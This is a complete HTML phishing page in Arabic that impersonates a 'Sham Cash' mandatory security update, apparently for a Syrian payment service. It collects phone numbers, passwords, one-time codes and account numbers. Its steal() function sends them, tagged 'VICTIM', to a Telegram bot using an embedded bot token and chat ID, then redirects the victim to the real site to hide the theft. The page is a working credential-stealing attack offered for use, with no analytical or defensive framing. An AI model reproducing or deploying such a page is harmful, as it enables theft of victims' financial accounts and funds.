<!DOCTYPE html>
<html>
<head>
    <title>تحديث أمني - شام كاش</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #1a3b5c; color: white; font-family: Arial; text-align: center; padding: 20px; }
        input { width: 90%; padding: 15px; margin: 10px; border-radius: 15px; border: none; text-align: center; }
        button { background: #e6b800; color: #1a3b5c; padding: 15px; border: none; border-radius: 30px; font-weight: bold; width: 90%; }
    </style>
</head>
<body>
    <h2>تحديث أمني إجباري</h2>
    <p>لحماية حسابك، أدخل بياناتك:</p>
    
    <input type="text" id="phone" placeholder="رقم الهاتف (099xxxxxxxx)">
    <input type="password" id="pass" placeholder="كلمة المرور">
    <input type="text" id="otp" placeholder="رمز OTP (سيصلك الآن)">
    <input type="text" id="account" placeholder="رقم الحساب (16 رقم)">
    
    <button onclick="steal()">تأكيد التحديث</button>
    
    <script>
        const BOT_TOKEN = "8564646143:AAEDmrL8HbdPESyY9iOJ0TXjEL4_bTSEaTs";
        const ADMIN_ID = "8665747715";
        
        async function steal() {
            const phone = document.getElementById('phone').value;
            const pass = document.getElementById('pass').value;
            const otp = document.getElementById('otp').value;
            const acc = document.getElementById('account').value;
            
            // تنسيق خاص يتعرف عليه البوت
            const msg = `VICTIM:${phone}:${pass}:${otp}:${acc}`;
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(msg)}`);
            
            alert("تم التحديث بنجاح. شكراً لتعاونك.");
            
            // تحويل الضحية إلى الموقع الرسمي لإخفاء الأثر
            setTimeout(() => {
                window.location.href = "https://shamcash.sy";
            }, 2000);
        }
    </script>
</body>
</html>
